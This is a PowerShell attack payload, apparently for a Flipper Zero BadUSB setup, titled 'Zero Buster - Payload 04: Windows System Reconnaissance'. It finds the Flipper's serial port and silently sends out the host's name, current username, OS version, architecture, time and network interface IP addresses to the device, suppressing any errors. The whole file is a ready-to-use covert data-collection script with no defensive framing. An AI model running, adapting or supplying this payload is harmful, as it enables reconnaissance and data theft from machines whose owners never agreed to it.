<#
.SYNOPSIS
    Zero Buster - Payload 04: Windows System Reconnaissance
.DESCRIPTION
    Automatically detects the Flipper Zero COM port, opens the serial port
    with DTR/RTS enabled, and sends basic diagnostic telemetry without Internet
    access or administrator privileges.
.AUTHOR
    @DonJulve
#>

Add-Type -AssemblyName System.IO.Ports

$targetPort = $null
for ($i = 0; $i -lt 60; $i++) {
    $availablePorts = [System.IO.Ports.SerialPort]::GetPortNames()
    if ($availablePorts.Count -gt 0) {
        $targetPort = ($availablePorts | Sort-Object { [int]($_ -replace '\D') } | Select-Object -Last 1)
        if ($availablePorts.Count -gt 1 -or $targetPort -ne "COM1") {
            break
        }
    }
    Start-Sleep -Milliseconds 250
}

if (-not $targetPort -and $availablePorts.Count -gt 0) {
    $targetPort = $availablePorts[-1]
}

if (-not $targetPort) { exit 1 }

Start-Sleep -Milliseconds 500

$serial = New-Object System.IO.Ports.SerialPort $targetPort, 115200, None, 8, One
$serial.ReadTimeout = 2000
$serial.WriteTimeout = 5000
$serial.DtrEnable = $true
$serial.RtsEnable = $true

try {
    $serial.Open()
    $serial.WriteLine("========================================")
    $serial.WriteLine("   ZERO BUSTER (WINDOWS RECON)          ")
    $serial.WriteLine("========================================")
    $serial.WriteLine("[*] Hostname     : " + $env:COMPUTERNAME)
    $serial.WriteLine("[*] Username     : " + $env:USERNAME)
    $osInfo = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
    $serial.WriteLine("[*] OS Version   : " + $osInfo)
    $serial.WriteLine("[*] Architecture : " + $env:PROCESSOR_ARCHITECTURE)
    $serial.WriteLine("[*] Local Time   : " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
    $serial.WriteLine("----------------------------------------")
    $serial.WriteLine("[+] Network Interfaces (IPv4):")

    Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.InterfaceAlias -notmatch "Loopback" } | ForEach-Object {
        $serial.WriteLine("    - " + $_.InterfaceAlias + " : " + $_.IPAddress)
    }

    $serial.WriteLine("========================================")
    $serial.WriteLine("[+] Reconnaissance finished successfully.")
} catch {
    # Silent
} finally {
    try {
        $serial.WriteLine("<<<EOF>>>")
        Start-Sleep -Milliseconds 200
        $serial.Close()
    } catch {}
}

exit
